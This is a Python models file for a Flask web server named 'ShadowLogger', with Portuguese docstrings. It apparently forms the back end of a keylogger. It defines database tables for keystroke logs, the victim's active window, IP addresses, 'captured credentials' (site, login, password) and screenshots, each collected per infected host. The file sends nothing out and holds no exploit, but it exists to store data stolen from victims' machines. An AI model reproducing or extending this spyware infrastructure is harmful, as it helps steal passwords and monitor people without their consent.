#!/usr/bin/env python3
"""Models Module - ShadowLogger Web Server."""

from datetime import datetime
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()


class Log(db.Model):
    """Modelo para logs de teclas."""
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100), nullable=False)
    ip = db.Column(db.String(50), nullable=False)
    keys_pressed = db.Column(db.Integer, default=0)
    words_typed = db.Column(db.Integer, default=0)
    active_window = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<Log {self.hostname} - {self.timestamp}>'


class Credential(db.Model):
    """Modelo para credenciais capturadas."""
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100), nullable=False)
    site = db.Column(db.String(100), nullable=False)
    login = db.Column(db.String(200))
    password = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<Credential {self.hostname} - {self.site}>'


class Screenshot(db.Model):
    """Modelo para screenshots."""
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100), nullable=False)
    filepath = db.Column(db.String(300), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<Screenshot {self.hostname} - {self.filepath}>'
